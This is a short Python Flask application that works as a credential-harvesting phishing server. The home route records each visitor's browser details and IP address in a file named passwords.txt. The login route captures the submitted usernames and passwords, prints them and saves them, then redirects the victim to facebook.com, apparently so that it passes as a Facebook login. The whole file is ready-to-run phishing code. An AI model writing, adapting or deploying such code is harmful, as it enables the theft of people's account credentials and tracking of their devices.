from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)



@app.route('/', methods=["GET"])
def home():
    machineDetails =request.headers.get('User-Agent')
    TargetIP = request.remote_addr
    f = open("data/passwords.txt", "a")
    f.write(" \nHost Captured: "+machineDetails+" : "+TargetIP)
    f.close()
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        machineDetails =request.headers.get('User-Agent')
        TargetIP = request.remote_addr
        print("Username: ",username)
        print("Password: ",password)
        f = open("data/passwords.txt", "a")
        f.write("\n User Captured"+username+" : "+password+" : "+machineDetails+" : "+TargetIP)
        f.close()
    return redirect("https://www.facebook.com")

if __name__ == '__main__':
    app.run(debug=True, host='172.17.5.248', port=80)
